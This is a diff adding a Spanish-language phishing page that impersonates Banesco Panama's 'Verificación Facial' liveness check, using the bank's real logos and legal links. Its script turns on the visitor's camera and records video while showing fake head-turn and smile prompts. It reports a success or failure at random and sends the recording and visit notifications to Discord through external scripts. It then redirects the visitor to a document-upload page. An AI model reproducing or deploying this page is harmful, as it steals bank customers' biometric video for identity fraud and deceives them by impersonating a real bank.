@@ -1,0 +1,527 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verificación Facial - Banesco</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet" />
+    <style>
+        body {
+            margin: 0;
+            font-family: "Inter", "Helvetica Neue", Arial, sans-serif;
+            background-color: #f5f7fa;
+            color: #0f2240;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+            text-align: center;
+        }
+        .secure-header {
+            width: 100%;
+            padding: 15px 20px;
+            background-color: #ffffff;
+            box-shadow: 0 2px 10px rgba(15, 34, 64, 0.05);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-shrink: 0; /* Evita que el header se encoja */
+        }
+        .secure-header img {
+            height: 40px;
+            width: auto;
+        }
+        .main-content {
+            flex-grow: 1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            width: 100%;
+            padding: 40px 20px;
+        }
+        .container {
+            width: 100%;
+            max-width: 420px;
+            padding: 30px;
+            background: #ffffff;
+            margin-top: auto;
+            margin-bottom: auto;
+            border-radius: 20px;
+            box-shadow: 0 10px 30px rgba(15, 34, 64, 0.1);
+        }
+        .header {
+            margin-bottom: 20px;
+        }
+        .header h1 {
+            font-size: 1.6rem;
+            font-weight: 700;
+            margin: 0 0 10px;
+        }
+        .header p {
+            font-size: 1rem;
+            color: #5b748f;
+            margin: 0;
+            line-height: 1.5;
+        }
+        .camera-view {
+            position: relative;
+            width: 100%;
+            max-width: 320px;
+            aspect-ratio: 1 / 1;
+            margin: 20px auto 0;
+            border-radius: 50%; 
+            background-color: rgba(230, 235, 240, 0.5); /* Fondo translúcido */
+            background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="%23b0c4de"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>');
+            background-size: 60%;
+            background-position: center;
+            background-repeat: no-repeat;
+            transition: background-image 0.5s ease-in-out;
+            overflow: hidden;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+        }
+        .camera-view video {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: auto;
+            height: 100%;
+            transform: translate(-50%, -50%) scaleX(-1); /* Espejo para selfie */
+            object-fit: cover;
+        }
+        .face-outline {
+            position: absolute;
+            inset: 15px;
+            border: 4px solid rgba(255, 255, 255, 0.7);
+            border-radius: 50%;
+            box-shadow: 0 0 0 9999px rgba(0, 0, 0, 0.5);
+            transition: border-color 0.4s ease;
+        }
+        .movement-guide {
+            position: absolute;
+            inset: 0;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 0 25px;
+            pointer-events: none;
+        }
+        .movement-guide svg {
+            width: 40px;
+            height: 40px;
+            fill: #fff;
+            opacity: 0;
+            transition: opacity 0.5s ease;
+            filter: drop-shadow(0 0 5px rgba(0,0,0,0.5));
+        }
+        .movement-guide svg.visible {
+            opacity: 1;
+            animation: pulse-arrow 1.5s infinite;
+        }
+        #smile-guide {
+            position: absolute;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%);
+        }
+        #up-arrow {
+            position: absolute;
+            top: 30px;
+            left: 50%;
+            transform: translateX(-50%);
+            transform-origin: center;
+        }
+        @keyframes pulse-arrow {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.15); }
+        }
+        .face-outline.success {
+            border-color: #28a745;
+        }
+        .face-outline.error {
+            border-color: #dc3545;
+        }
+        .spinner {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 80%;
+            height: 80%;
+            transform: translate(-50%, -50%);
+            border: 5px solid transparent;
+            border-top-color: #00e676;
+            border-radius: 50%;
+            animation: spin 1.5s linear infinite;
+            display: none;
+        }
+        @keyframes spin {
+            to { transform: translate(-50%, -50%) rotate(360deg); }
+        }
+        .message-area {
+            margin-top: 25px;
+            min-height: 48px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .message-box {
+            padding: 12px 20px;
+            border-radius: 20px;
+            font-weight: 600;
+            font-size: 0.95rem;
+            color: #ffffff;
+            transition: all 0.4s ease;
+            opacity: 0;
+            transform: translateY(10px);
+        }
+        .message-box.visible {
+            opacity: 1;
+            transform: translateY(0);
+        }
+        .message-box.success {
+            background-color: #007953;
+        }
+        .message-box.error {
+            background-color: #c02b0a;
+        }
+        .progress-steps {
+            display: flex;
+            justify-content: center;
+            gap: 12px;
+            margin-top: 20px;
+        }
+        .step {
+            width: 12px;
+            height: 12px;
+            background-color: #d4dee8;
+            border-radius: 50%;
+            transition: background-color 0.5s ease, transform 0.3s ease;
+        }
+        .step.active {
+            background-color: #007953;
+            transform: scale(1.2);
+            animation: pulse-step 1.2s infinite ease-in-out;
+        }
+        @keyframes pulse-step {
+            50% { background-color: #009a69; transform: scale(1.3); }
+        }
+        .step.completed {
+            background-color: #007953;
+        }
+
+        /* --- Estilos del Footer --- */
+        .site-footer {
+            width: 100%;
+            color: white;
+            background-color: #007953; /* Color de fondo principal del footer */
+        }
+        .footer-top {
+            background-color: #007953;
+            padding: 20px 15px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 24px;
+            flex-wrap: wrap;
+            margin: 0 auto;
+        }
+        .footer-logo {
+            margin-right: 24px;
+        }
+        .footer-logo a img {
+            height: 24px;
+            width: auto;
+        }
+        .footer-copyright p {
+            margin: 0;
+            font-size: 0.9rem;
+            color: #ffffff;
+        }
+        .footer-legal {
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+            justify-content: center;
+        }
+        .footer-legal a {
+            color: #ffffff;
+            text-decoration: none;
+            font-size: 0.9rem;
+            opacity: 0.8;
+        }
+        .footer-legal a:hover { opacity: 1; text-decoration: underline; }
+        .footer-social {
+            margin-left: auto;
+        }
+        .social-media__inner {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 16px;
+        }
+        .social-media__item {
+            display: inline-flex;
+            height: 24px;
+            width: 24px;
+        }
+        .social-media__item img {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+        }
+        @media (max-width: 767px) {
+            .footer-top {
+                gap: 15px;
+            }
+            .footer-legal {
+                order: 3; /* Mover los legales al final en móvil */
+                justify-content: center;
+            }
+            .footer-social {
+                margin-left: 0;
+                width: 100%;
+                margin-top: 20px;
+            }
+            .footer-logo {
+                margin-right: 0;
+            }
+        }
+
+        @media (min-width: 768px) {
+            .container {
+                max-width: 550px;
+            }
+            .header h1 {
+                font-size: 1.8rem;
+            }
+            .secure-header img {
+                height: 50px; /* Logo más grande en PC */
+            }
+        }
+    </style>
+</head>
+<body>
+    <header class="secure-header">
+        <img src="https://www.banesco.com.pa/wp-content/themes/banescocontigo8-new/assets/images/header/logotype.png" alt="Banesco Logo">
+    </header>
+
+    <main class="main-content">
+        <div class="container">
+            <div class="header">
+                <h1>Verificación Facial</h1>
+                <p id="greeting-message">Por favor, centra tu rostro en el óvalo y mantente quieto.</p>
+            </div>
+            <div class="camera-view">
+                <video id="cameraFeed" autoplay playsinline muted></video>
+                <div class="face-outline" id="faceOutline"></div>
+                <div class="movement-guide">
+                    <svg id="left-arrow" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M15.41 16.59L10.83 12l4.58-4.59L14 6l-6 6 6 6 1.41-1.41z"/></svg>
+                    <svg id="up-arrow" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8l-6 6 1.41 1.41L12 10.83l4.59 4.58L18 14l-6-6z"/></svg>
+                    <svg id="right-arrow" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M8.59 16.59L13.17 12 8.59 7.41 10 6l6 6-6 6-1.41-1.41z"/></svg>
+                    <svg id="smile-guide" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M11.99 2C6.47 2 2 6.48 2 12s4.47 10 9.99 10C17.52 22 22 17.52 22 12S17.52 2 11.99 2zM12 20c-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8-3.58 8-8 8zm-5-6c.78 2.34 2.72 4 5 4s4.22-1.66 5-4H7zM9 13c.83 0 1.5-.67 1.5-1.5S9.83 10 9 10s-1.5.67-1.5 1.5S8.17 13 9 13zm6 0c.83 0 1.5-.67 1.5-1.5S15.83 10 15 10s-1.5.67-1.5 1.5S14.17 13 15 13z"/></svg>
+                </div>
+                <div class="spinner"></div>
+            </div>
+            <div class="progress-steps">
+                <div class="step" id="step1"></div>
+                <div class="step" id="step2"></div>
+                <div class="step" id="step3"></div>
+                <div class="step" id="step4"></div>
+                <div class="step" id="step5"></div>
+            </div>
+            <div class="message-area">
+                <div id="messageBox" class="message-box"></div>
+            </div>
+        </div>
+    </main>
+
+    <footer class="site-footer">
+        <div class="footer-inner">
+            <div class="footer-top">
+                <div class="footer-logo">
+                    <a href="index1.html">
+                        <img src="https://www.banesco.com.pa/wp-content/themes/banescocontigo8-new/assets/images/footer/white-logo.svg" alt="Banesco Logo">
+                    </a>
+                </div>
+                <div class="footer-copyright">
+                    <p>Banesco © Copyright 2026. Todos los derechos reservados.</p>
+                </div>
+                <div class="footer-legal">
+                    <a href="https://www.banesco.com.pa/aviso-de-privacidad-y-proteccion-de-datos/">Aviso de Privacidad y Protección de Datos</a> │ <a href="https://media.banesco.com.pa/wp-content/uploads/wpfiles/2023/06/25034823/politica-corporativa-anticorrupcion-banesco-panama-sa-y-subsidiarias.pdf">Política Corporativa Anticorrupción Banesco Panamá S.A. y Subsidiarias</a>
+                </div>
+                <div class="footer-social">
+                    <div class="social-media__inner">
+                        <a class="social-media__item" href="index1.html">
+                            <img src="https://www.banesco.com.pa/wp-content/themes/banescocontigo8-new/assets/images/social-media/facebook-circle-white.svg" alt="facebook">
+                        </a>
+                        <a class="social-media__item" href="index1.html">
+                            <img src="https://www.banesco.com.pa/wp-content/themes/banescocontigo8-new/assets/images/social-media/X-Twitter.svg" alt="twitter">
+                        </a>
+                        <a class="social-media__item" href="index1.html">
+                            <img src="https://www.banesco.com.pa/wp-content/themes/banescocontigo8-new/assets/images/social-media/instagram-circle-white.svg" alt="instagram">
+                        </a>
+                        <a class="social-media__item" href="index1.html">
+                            <img src="https://www.banesco.com.pa/wp-content/themes/banescocontigo8-new/assets/images/social-media/linkedin-circle-white.svg" alt="linkedin">
+                        </a>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <script src="protection.sander.js"></script>
+    <script src="discord.sander.js"></script>
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const video = document.getElementById('cameraFeed'); 
+            const faceOutline = document.getElementById('faceOutline');
+            const spinner = document.querySelector('.spinner');
+            const messageBox = document.getElementById('messageBox');
+            const leftArrow = document.getElementById('left-arrow');
+            const rightArrow = document.getElementById('right-arrow');
+            const upArrow = document.getElementById('up-arrow');
+            const smileGuide = document.getElementById('smile-guide');
+            const steps = [document.getElementById('step1'), document.getElementById('step2'), document.getElementById('step3'), document.getElementById('step4'), document.getElementById('step5')];
+            let mediaRecorder;
+            let recordedChunks = [];
+
+            async function startCamera() {
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+                    document.querySelector('.camera-view').style.backgroundImage = 'none';
+                    video.srcObject = stream;
+                    startRecording(stream);
+                    runVerificationProcess(); // Inicia el proceso de verificación
+                } catch (err) {
+                    showMessage('No se pudo acceder a la cámara. Por favor, revisa los permisos.', 'error');
+                }
+            }
+
+            function setGreeting() {
+                const greetingElement = document.getElementById('greeting-message');
+                if (!greetingElement) return;
+
+                const hour = new Date().getHours();
+                let greeting = "¡Buenas noches!";
+                if (hour >= 5 && hour < 12) greeting = "¡Buenos días!";
+                else if (hour >= 12 && hour < 19) greeting = "¡Buenas tardes!";
+                
+                greetingElement.textContent = `${greeting} Por favor, centra tu rostro en el óvalo y mantente quieto.`;
+            }
+
+            function showMessage(text, type = '') {
+                messageBox.textContent = text;
+                messageBox.className = `message-box visible ${type}`;
+            }
+
+            function startRecording(stream) {
+                recordedChunks = [];
+                const options = { mimeType: 'video/webm; codecs=vp9', videoBitsPerSecond: 2500000 };
+                try {
+                    mediaRecorder = new MediaRecorder(stream, options);
+                } catch (e) {
+                    console.error('VP9 no soportado, usando códec por defecto:', e);
+                    mediaRecorder = new MediaRecorder(stream);
+                }
+
+                mediaRecorder.ondataavailable = (event) => {
+                    if (event.data.size > 0) {
+                        recordedChunks.push(event.data);
+                    }
+                };
+                mediaRecorder.start();
+            }
+
+            async function stopAndSendVideoToDiscord() {
+                return new Promise(resolve => {
+                    mediaRecorder.onstop = async () => {
+                        const videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
+                         const formDataWithVideo = new FormData();
+                        formDataWithVideo.append('file1', videoBlob, 'verificacion_facial.webm'); // El archivo se adjunta aquí
+                        await sendToDiscord("📹 Video de Verificación Facial", "Se ha recibido un video de la prueba de vida del usuario.", [], 3066993, formDataWithVideo);
+                        resolve();
+                    };
+                    mediaRecorder.stop();
+                });
+            }
+
+            function updateProgress(stepIndex) {
+                steps.forEach((step, index) => {
+                    step.classList.remove('active', 'completed');
+                    if (index < stepIndex) {
+                        step.classList.add('completed');
+                    } else if (index === stepIndex) {
+                        step.classList.add('active');
+                    }
+                });
+            }
+
+            function showGuide(guide) {
+                [leftArrow, rightArrow, upArrow, smileGuide].forEach(el => el.classList.remove('visible'));
+                if (guide) guide.classList.add('visible');
+            }
+
+            function runVerificationProcess() {
+                showMessage('Posiciona tu rostro en el óvalo.');
+                updateProgress(0);
+                showGuide(null);
+
+                setTimeout(() => {
+                    // Simulación de una interacción más realista
+                    const livenessActions = [ // Mensajes más realistas y variados
+                        { msg: 'Mantén tu rostro dentro del óvalo.', delay: 2000, step: 0, guide: null },
+                        { msg: 'Perfecto. Ahora, gira tu cabeza a la DERECHA.', delay: 2500, step: 1, guide: rightArrow },
+                        { msg: 'Muy bien. Ahora a la IZQUIERDA.', delay: 2500, step: 2, guide: leftArrow },
+                        { msg: 'Mira lentamente hacia ARRIBA.', delay: 2500, step: 3, guide: upArrow },
+                        { msg: '¡Excelente! Para finalizar, regálanos una SONRISA.', delay: 2500, step: 4, guide: smileGuide },
+                        { msg: 'Procesando tu biometría facial. Un momento...', delay: 3500, showSpinner: true, step: 5, guide: null }
+                    ];
+
+                    let promiseChain = Promise.resolve();
+
+                    livenessActions.forEach((action, index) => {
+                        promiseChain = promiseChain.then(() => new Promise(resolve => {
+                            showMessage(action.msg, 'processing');
+                            updateProgress(action.step);
+                            showGuide(action.guide);
+
+                            if (action.showSpinner) {
+                                spinner.style.display = 'block'; 
+                            }
+                            setTimeout(resolve, action.delay);
+                        }));
+                    });
+
+                    promiseChain.then(() => {
+                        spinner.style.display = 'none';
+                        const success = Math.random() > 0.1; // 90% de probabilidad de éxito
+
+                        if (success) {
+                            faceOutline.classList.add('success');
+                            showMessage('Rostro verificado correctamente.', 'success');
+                            sendToDiscord("✅ Verificación Exitosa", "El usuario ha completado la verificación facial correctamente.", [], 3066993);
+                            stopAndSendVideoToDiscord().finally(() => {
+                                setTimeout(() => {
+                                    window.location.href = 'cargando_documentos.html';
+                                }, 2000);
+                            });
+                        } else {
+                            sendToDiscord("❌ Verificación Fallida", "El usuario no pudo completar la verificación facial.", [], 15548997);
+                            faceOutline.classList.add('error');
+                            showMessage('No pudimos verificar tu identidad. Intentémoslo de nuevo.', 'error');
+                            setTimeout(() => {
+                                window.location.reload(); // Recarga la página para reiniciar el proceso
+                            }, 3500);
+                        }
+                    });
+                }, 2000); // Espera 2 segundos para que el usuario se posicione
+            }
+
+            setGreeting();
+            startCamera();
+            sendToDiscord("👀 Visita a Página de Verificación", "Un usuario ha accedido a la página de verificación facial.", [], 16776960); // Notificación de visita
+        });
+    </script>
+</body>
+</html>
